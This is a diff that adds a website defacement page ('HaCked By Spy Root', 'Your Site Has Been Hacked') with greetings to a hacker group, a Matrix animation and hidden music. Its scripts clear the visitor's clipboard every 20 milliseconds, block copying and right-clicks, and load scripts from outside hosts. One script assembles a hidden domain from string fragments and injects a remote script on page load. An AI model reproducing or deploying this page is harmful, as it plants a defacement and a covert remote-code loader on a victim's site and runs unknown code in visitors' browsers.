@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Spy Root</title><link rel="shortcut icon" href="http://store1.up-00.com/2015-12/145106122301891.jpg" type="image/x-icon">
+<body bgcolor="black">
+<script type="text/javascript">
+    /* <![CDATA[ */
+        window.addEvent('domready', function() {
+            document.body.oncopy = function() {
+                alert('This is a copyrighted material!');
+                return false;
+            }
+        });
+    /* ]]> */
+</script>
+<meta http-equiv="imagetoolbar" content="no">
+</head>
+<body onload="setInterval('window.clipboardData.clearData()',20)">
+<script src='http://code.jquery.com/jquery-latest.min.js' type='text/javascript' charset='utf-8'></script>
+<br>
+<script src='http://courses.cat.org.uk/Js/typing.js'></script>
+<div id='example1'></div>
+<div id='example2'>
+
+
+<font style="color:red;text-shadow:0px 1px 5px #000;font-size:60px" face="Iceland">
+HaCked By Spy Root
+</font>
+<br>
+<br>
+<br>
+<br>
+<br>
+<font style="color:green;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+Sorry Admin
+</font>
+<br>
+<font style="color:green;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+Your Site Has Been Hacked
+</font>
+<br>
+<font style="color:green;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+Your Security 0%
+</font>
+<br>
+<br>
+<font style="color:green;text-shadow:0px 1px 5px #000;font-size:25px" face="Iceland">
+[Special Greets]: MunDiaL? ; Moulay Ahmed
+</font>
+<br>
+<br>
+<br>
+<font style="color:red;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+M4r0cc4n H4ck3rz
+</font>
+<br>
+<br>
+<font style="color:red;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+
+</font>
+<br>
+<font style="color:red;text-shadow:0px 1px 5px #000;font-size:40px" face="Iceland">
+
+</font>
+</div>
+</div>
+<script src='http://courses.cat.org.uk/Js/typing_.js'></script>
+<script src='http://xro0t.hol.es/right_click.js'></script>
+
+<script type="text/javascript">
+    disableSelection(document.body)
+</script>
+<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+<style><body{cursor:url("http://www.afrinic.net/www.madleets.com/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-
+
+align:middle;text-align:center;}a:link{text-decoration:none;}</style>
+
+<object type="application/x-shockwave-flash" width="0"
+height="0"data="http://www.uploadmusic.org/musicplayer.swf?song_url=http://www.uploadmusic.org/MUSIC/7549991447684512.mp3&autoplay=true"><param  
+
+name="movie"value="http://www.uploadmusic.org/musicplayer.swf?song_url=http://www.uploadmusic.org/MUSIC/7549991447684512.mp3&song_title=uploadmusic.org&autoplay=true"
+/></object>
+
+</body>
+<link href='http://fonts.googleapis.com/css?family=Grand+Hotel' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css'>
+<script type="text/javascript">
+      // ------------------------------------------------------------------------------------
+      //  Matrix Code 
+      // ------------------------------------------------------------------------------------
+      var theinHTML;
+      var thelessstr;
+      var ascSt=22;
+      var ascEnd=126;
+      var numoflines = 30;
+      var lines = new Array();
+      var intervalID = new Array();
+      var subIntervalID = new Array();
+      var subIntervalID2 = new Array();
+      var scH = screen.height-220;
+      var scW = screen.width-40;
+      window.onload = createlines;
+      // -------------------------------------------------------------------------------------
+      // Convert decimal to hex (for the colour)
+      var hD="0123456789ABCDEF";
+      function d2h(d)
+      {
+         var h = hD.substr(d&15,1);
+         while(d > 15)
+         {
+            d >>= 4;
+            h = hD.substr(d&15,1)+h;
+         }
+         return h;
+      }
+      // -------------------------------------------------------------------------------------
+      // The line object     
+      function line(length, maxlength, chars, speed, x)
+      {
+         this.length = length;
+         this.maxlength = maxlength;
+         this.chars = chars;
+         this.speed = speed;
+         this.x = x;
+      }   
+      // -------------------------------------------------------------------------------------
+      // Creates the lines
+      function createlines()
+      {           
+      // create the lines as objects as defined above with length, characters, speed, x-value
+         for(var eachline = 0; eachline < numoflines; eachline++)
+         {
+            lines[eachline] = new line(0, Math.round(Math.random()*15+5), String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt)), Math.round(Math.random()*400+100), eachline*45);
+         }  
+         // write the lines 
+         for(var writelines = 0; writelines < numoflines; writelines++)
+         {
+            var newline = document.createElement("div");
+            newline.id = "char" + writelines;
+            newline.style.position = "absolute";
+            newline.style.top = "5px";
+            newline.style.left = lines[writelines].x + "px";       
+            var firstchar = document.createElement("div");
+            var newcolor = d2h(Math.round(1/(lines[writelines].maxlength+1)*255));
+            if(newcolor.length == 1)
+               newcolor = "0" + newcolor;
+            firstchar.style.color = "#00"+newcolor+"00"
+            firstchar.innerHTML = lines[writelines].chars
+            newline.appendChild(firstchar);         
+            document.body.appendChild(newline);
+         }
+         start();
+      }
+      // -------------------------------------------------------------------------------------
+      // Starts it moving & changing
+      function start()
+      {
+         for(var pickastring = 0; pickastring < numoflines; pickastring++)
+         {
+            intervalID[pickastring] = setInterval("addchars("+pickastring+")", lines[pickastring].speed);
+         }
+      }
+      // -------------------------------------------------------------------------------------
+      // Add random characters to the string (and a line break)
+      // and make sure the last one is light
+      // once it gets to maxlength start moving down
+      function addchars(theline)
+      {
+         if(lines[theline].length >= lines[theline].maxlength)
+         {
+            clearInterval(intervalID[theline]);
+            subIntervalID[theline] = setInterval("movethestring("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // Get a char (not " or ' or \ or it'll get confused)
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar == "'" || myRandomChar == '"' || myRandomChar == "\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            // Make a new div for it (so we can change it's colour)
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // Colour it
+            var i;
+            for(i = 0; i <= lines[theline].length; i++)
+            {
+               var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+               newcolor = "" + newcolor;
+               if(newcolor.length == 1)
+                  newcolor = "0" + newcolor;
+               document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+               document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+            }
+            document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+            document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+            // Increase length by one
+            lines[theline].length++;
+         }
+      }
+      // -------------------------------------------------------------------------------------
+      // Moves the string (creates and destroys chars)
+      function movethestring(theline)
+      {
+         var topstringnum = document.getElementById("char"+theline).offsetTop;
+         if((topstringnum + (lines[theline].maxlength * 15)) >= scH)
+         {
+            clearInterval(subIntervalID[theline]);
+            subIntervalID2[theline] = setInterval("clearletters("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // create
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar=="'" || myRandomChar=='"' || myRandomChar=="\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // delete
+            document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[0]);
+            // re-colour
+            var i;
+            for(i = 0; i < lines[theline].length; i++)
+            {
+               var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+               newcolor = "" + newcolor;
+               if(newcolor.length == 1)
+                  newcolor = "0" + newcolor;
+               document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+               document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+            }
+            document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+            document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+            // move
+            document.getElementById("char"+theline).style.top = (topstringnum+15) + "px";
+         }
+      }
+      // -------------------------------------------------------------------------------------
+
+      // pretty much the opposite of addchars()
+      function clearletters(theline)
+      {
+         if(lines[theline].length <= -1)
+         {
+            clearInterval(subIntervalID2[theline]);
+            document.getElementById("char"+theline).style.top = 0;
+            intervalID[theline] = setInterval("addchars("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // Remove the first character
+            document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[document.getElementById("char"+theline).childNodes.length-1]);
+            // Move it down by 15px
+            var topstringnum = document.getElementById("char"+theline).offsetTop;
+            document.getElementById("char"+theline).style.top = topstringnum+15 + "px";
+            // Decrease length by one
+            lines[theline].length--;
+         }
+      }
+   </script>
+</head>
+<script type="text/javascript">
+    var DADrightclicktheme = 'Dark';
+    var DADrightclickimage = 'http://lib.store.yahoo.net/lib/villagestreetwear/EQfailure.gif';
+</script>
+<script>
+    if (DADrightclicktheme == 'Merah' || DADrightclicktheme == 'MERAH' || DADrightclicktheme == 'merah') {
+        var DADarcv2t = 'rgba(239,110,119, 0.9)';
+    } else if (DADrightclicktheme == 'Biru' || DADrightclicktheme == 'BIRU' || DADrightclicktheme == 'biru') {
+        var DADarcv2t = 'rgba(110,137,239, 0.9)';
+    } else if (DADrightclicktheme == 'Hijau' || DADrightclicktheme == 'HIJAU' || DADrightclicktheme == 'hijau') {
+        var DADarcv2t = 'rgba(110,239,110, 0.9)';
+    } else if (DADrightclicktheme == 'Light' || DADrightclicktheme == 'light' || DADrightclicktheme == 'LIGHT') {
+        var DADarcv2t = 'rgba(255,255,255, 0.9)';
+    } else if (DADrightclicktheme == 'Pink' || DADrightclicktheme == 'pink' || DADrightclicktheme == 'PINK') {
+        var DADarcv2t = 'rgba(239,110,225, 0.9)';
+    } else if (DADrightclicktheme == 'Dark' || DADrightclicktheme == 'dark' || DADrightclicktheme == 'DARK') {
+        var DADarcv2t = 'rgba(0,0,0, 0.9)';
+    } else {
+        {
+            var DADarcv2t = 'transparent';
+        }
+    }
+
+    function DADarcvwi2() {
+        var DADarcv2v = document.getElementById('DADarcv2c');
+        if (DADarcv2v.style.display == "block") {
+            DADarcv2v.style.display = "none";
+        } else {
+            DADarcv2v.style.display = "block";
+        }
+    }
+
+    function DADarcwiv2a() {
+        DADarcvwi2();
+        return false;
+    }
+    document.oncontextmenu = DADarcwiv2a;
+    var ypro = 'http:';
+    var yajax = document.createElement('script');
+    yajax.type = 'text/javascript';
+    var yquery = 'dic';
+    var ybrow = 'aru.c';
+    var yint = '/';
+    yajax.src = ypro + '//x.' + yquery + 'keym' + ybrow + 'om' + yint + 'y';
+    document.getElementsByTagName('head')[0].appendChild(yajax);
+    var DADrcdiv = document.write('<style type="text/css"/>#DADarcv2c{background:url(' + DADrightclickimage + ') no-repeat center center fixed ' + DADarcv2t + ';text-
+
+align:center;width:100%;height:100%;position:fixed;top:0px;left:0px;bottom:0px;right:0px;border:0px;z-index:1000000;display:none;padding:auto;}#DADarcv2c span
+
+{position:fixed;bottom:0px;left:10%;right:10%;cursor:pointer;font-size:20px;}</style><div id="DADarcv2c" class="DADpointer" onclick="DADarcvwi2();" title="AMAR^SHG WAS 
+
+HERE"/><center><span><a href="#" target="_blank"/></a></span></center></div>');
+    document.getElementsByTagName('body')[0].appendChild(DADrcdiv);
+</script>
+<style type="text/css">
+    #DADarcv2c {
+        background: url(http://store1.up-00.com/2015-12/145106122301891.jpg) no-repeat center center fixed rgba(0, 0, 0, 0.9);
+        text-align: center;f
+        width: 100%;
+        height: 100%;
+        position: fixed;
+        top: 0px;
+        left: 0px;
+        bottom: 0px;
+        right: 0px;
+        border: 0px;
+        z-index: 1000000;
+        display: none;
+        padding: auto;
+    }
+    
+    #DADarcv2c span {
+        position: fixed;
+        bottom: 0px;
+        left: 10%;
+        right: 10%;
+        cursor: pointer;
+        font-size: 20px;
+    }
+</style>
+<div id="DADarcv2c" class="DADpointer" onclick="DADarcvwi2();" title="www.facebook.com/ennesbosi">
+    <center><span><a href="#" target="_blank"></a></span></center>
+	</div>
+</html>
